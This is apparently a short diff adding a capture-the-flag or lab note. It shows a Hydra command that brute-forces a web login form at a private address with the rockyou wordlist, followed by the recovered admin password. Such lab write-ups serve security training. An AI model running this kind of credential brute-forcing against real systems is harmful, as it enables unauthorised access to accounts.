@@ -1,0 +1,4 @@
+Using Hydra :
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f 172.20.10.10 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer.gif"
+Login : admin
+Password : shadow
